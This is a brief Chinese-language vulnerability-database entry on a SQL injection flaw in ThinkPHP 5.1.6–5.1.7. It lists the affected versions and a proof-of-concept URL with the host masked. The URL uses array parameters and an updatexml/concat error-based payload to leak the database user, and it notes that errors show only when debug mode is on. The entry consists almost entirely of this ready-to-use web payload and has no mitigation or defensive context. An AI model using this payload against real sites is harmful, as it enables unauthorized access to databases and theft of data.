---
title: 'Thinkphp 5.1.(6-8) sql注入漏洞'
date: Sat, 03 Oct 2020 16:28:41 +0000
draft: false
tags: ['白阁-漏洞库']
---

### 漏洞影响

5.1.6<=ThinkPHP<=5.1.7 非最新版5.1.8

### 漏洞POC

没开启debug看不到报错信息```
http://********/index/index/index?username[0]=point&username[1]=1&username[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&username[3]=0 

